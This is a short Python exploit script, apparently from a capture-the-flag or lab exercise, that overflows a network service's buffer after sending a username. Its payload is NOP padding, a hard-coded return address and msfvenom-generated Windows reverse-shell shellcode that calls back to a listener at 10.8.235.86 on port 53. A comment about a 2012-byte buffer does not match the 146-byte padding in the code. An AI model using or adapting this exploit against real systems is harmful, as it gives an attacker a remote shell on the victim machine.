#!/usr/bin/env python

# Skeleton Buffer Overflow script
# usage python brain.py <targetIP> <targetPort>

import socket
import sys

rhost = sys.argv[1]
rport = int(sys.argv[2])

uname = "yavuz"

# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.235.86 LPORT=53 -f c -b "\x00"
shellcode = (
 "\xda\xcd\xbf\x49\xae\x8f\xa9\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x7e\x17\x03\x7e\x17\x83\xa7\x52\x6d\x5c\xcb\x43\xf0"
"\x9f\x33\x94\x95\x16\xd6\xa5\x95\x4d\x93\x96\x25\x05\xf1\x1a"
"\xcd\x4b\xe1\xa9\xa3\x43\x06\x19\x09\xb2\x29\x9a\x22\x86\x28"
"\x18\x39\xdb\x8a\x21\xf2\x2e\xcb\x66\xef\xc3\x99\x3f\x7b\x71"
"\x0d\x4b\x31\x4a\xa6\x07\xd7\xca\x5b\xdf\xd6\xfb\xca\x6b\x81"
"\xdb\xed\xb8\xb9\x55\xf5\xdd\x84\x2c\x8e\x16\x72\xaf\x46\x67"
"\x7b\x1c\xa7\x47\x8e\x5c\xe0\x60\x71\x2b\x18\x93\x0c\x2c\xdf"
"\xe9\xca\xb9\xfb\x4a\x98\x1a\x27\x6a\x4d\xfc\xac\x60\x3a\x8a"
"\xea\x64\xbd\x5f\x81\x91\x36\x5e\x45\x10\x0c\x45\x41\x78\xd6"
"\xe4\xd0\x24\xb9\x19\x02\x87\x66\xbc\x49\x2a\x72\xcd\x10\x23"
"\xb7\xfc\xaa\xb3\xdf\x77\xd9\x81\x40\x2c\x75\xaa\x09\xea\x82"
"\xcd\x23\x4a\x1c\x30\xcc\xab\x35\xf7\x98\xfb\x2d\xde\xa0\x97"
"\xad\xdf\x74\x37\xfd\x4f\x27\xf8\xad\x2f\x97\x90\xa7\xbf\xc8"
"\x81\xc8\x15\x61\x2b\x33\xfe\x84\xa4\xd0\xa8\xf0\xb6\x26\x55"
"\x34\x3e\xc0\x3f\x26\x16\x5b\xa8\xdf\x33\x17\x49\x1f\xee\x52"
"\x49\xab\x1d\xa3\x04\x5c\x6b\xb7\xf1\xac\x26\xe5\x54\xb2\x9c"
"\x81\x3b\x21\x7b\x51\x35\x5a\xd4\x06\x12\xac\x2d\xc2\x8e\x97"
"\x87\xf0\x52\x41\xef\xb0\x88\xb2\xee\x39\x5c\x8e\xd4\x29\x98"
"\x0f\x51\x1d\x74\x46\x0f\xcb\x32\x30\xe1\xa5\xec\xef\xab\x21"
"\x68\xdc\x6b\x37\x75\x09\x1a\xd7\xc4\xe4\x5b\xe8\xe9\x60\x6c"
"\x91\x17\x11\x93\x48\x9c\x21\xde\xd0\xb5\xa9\x87\x81\x87\xb7"
"\x37\x7c\xcb\xc1\xbb\x74\xb4\x35\xa3\xfd\xb1\x72\x63\xee\xcb"
"\xeb\x06\x10\x7f\x0b\x03"
)


# Buffer was 2012 in this app, so 2012 times NOP, then the bad chrs, then another 20 NOP and then shellcodecomes.
payload = "\x90" * 146 + "\xc3\x14\x04\x08" + "\x90" * 5 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c = s.connect((rhost, rport))
s.send(uname + "\r\n")
s.recv(1024)
s.send(payload + "\r\n")
data = s.recv(1024)
s.close()
